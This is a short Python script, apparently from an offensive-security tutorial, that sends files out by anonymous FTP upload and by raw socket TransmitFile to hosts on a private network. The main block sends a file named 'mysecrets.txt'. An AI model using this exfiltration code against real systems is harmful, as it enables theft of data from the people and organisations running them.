import ftplib
import os
import socket

import win32file  # ty:ignore[unresolved-import]


def plain_ftp(doc_path, server="192.168.1.203"):
    ftp = ftplib.FTP(server)

    ftp.login("anonymous", "anon@example.com")
    ftp.cwd("/pub/")
    ftp.storbinary(f"STOR {os.path.basename(doc_path)}", open(doc_path, "rb"), 1024)

    ftp.quit()


def transmit(document_path):
    client = socket.socket()

    client.connect(("192.168.1.207", 10000))

    with open(document_path, "rb") as f:
        win32file.TransmitFile(
            client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b"", b""
        )


if __name__ == "__main__":
    transmit("./mysecrets.txt")
